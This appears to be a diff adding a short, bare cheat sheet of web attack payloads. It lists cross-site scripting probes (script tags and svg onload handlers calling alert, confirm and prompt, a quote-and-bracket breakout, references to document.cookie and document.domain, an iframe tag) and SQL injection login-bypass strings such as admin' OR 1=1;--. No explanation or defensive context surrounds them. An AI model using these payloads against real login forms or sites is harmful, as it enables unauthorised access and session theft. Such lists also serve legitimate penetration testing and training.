@@ -1,0 +1,20 @@
+"<>(){}
+<script>alert(1);</script>
+<svg/onload=alert(1);>
+<svg/onload=confirm(1);>
+prompt(1)
+"><svg/onload=alert(1);>
+document.cookie
+document.domain
+
+
+
+SQL injection
+admin admin
+admin--' admin--
+admin' OR 1=1;
+admin' OR 1=1;--
+
+
+
+<iframe src="url"></iframe>
